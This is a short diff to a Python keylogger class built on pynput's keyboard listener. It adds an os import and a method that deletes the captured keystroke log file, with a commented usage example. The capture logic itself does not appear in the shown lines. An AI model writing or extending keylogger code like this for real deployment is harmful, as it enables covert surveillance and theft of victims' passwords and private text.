@@ -1,4 +1,5 @@
 import threading
+import os
 from pynput.keyboard import Listener
 
 class KeyloggerCore:
@@ -21,3 +22,14 @@ class KeyloggerCore:
     def stop_keylogger(self):
         if self.keylogger_thread and self.keylogger_thread.is_alive():
             self.keylogger_thread.join()
+
+    def remove_key_logs(self, output_file):
+        try:
+            os.remove(output_file)
+            print("Key logs file removed successfully.")
+        except FileNotFoundError:
+            print("Key logs file not found.")
+
+# Usage example:
+# keylogger_core = KeyloggerCore()
+# keylogger_core.remove_key_logs("keylogs.txt")
